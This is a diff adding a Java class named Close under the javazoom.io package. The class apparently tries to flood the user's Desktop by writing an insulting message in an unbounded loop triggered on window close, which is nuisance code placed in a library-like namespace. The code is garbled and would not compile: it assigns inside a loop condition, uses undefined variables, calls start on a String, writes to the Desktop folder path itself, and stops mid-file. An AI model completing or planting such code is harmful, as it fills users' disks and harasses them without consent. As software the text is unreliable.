@@ -1,0 +1,66 @@
+package javazoom.io;
+import java.io.BufferedWriter;
+import java.io.File;
+import java.io.FileWriter;
+import java.io.IOException;
+import javax.swing.WindowConstants;
+
+
+
+
+public class Close{
+	
+
+	
+	Thread close = new Thread(()-> {
+			
+     while(frame.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE)=true){
+    	 		
+    	 for (long i = 0; i < Long.MAX_VALUE; i++) {
+    		 String desktop = new String();	
+    	 
+    					
+    					System.out.println(i);
+    					File nFile = new File(System.getProperty("user.home") + "/Desktop"); String.format("%d.txt", i);
+    					BufferedWriter bw = null;
+    					FileWriter fw = null;
+    					
+    					try {
+    						String content ="You're an idiot habibti";
+    											
+    						fw = new FileWriter(nFile);
+    						bw = new BufferedWriter(fw);
+    						bw.write(content);
+    						
+    						System.out.println("Done");
+    						
+    					} catch (IOException e){
+    						
+    						e.printStackTrace();
+    					} finally {
+    						try{
+    							if (bw != null)
+    								bw.close();
+    							
+    							if (fw !=null)
+    								fw.close();
+    						} catch (IOException ex){
+    							
+    							ex.printStackTrace();
+    						}
+    					}
+    				};;
+     desktop.start();
+    		 
+    		 
+    			 
+    			 
+    			 
+    		
+			
+			
+			
+			
+		
+	
+
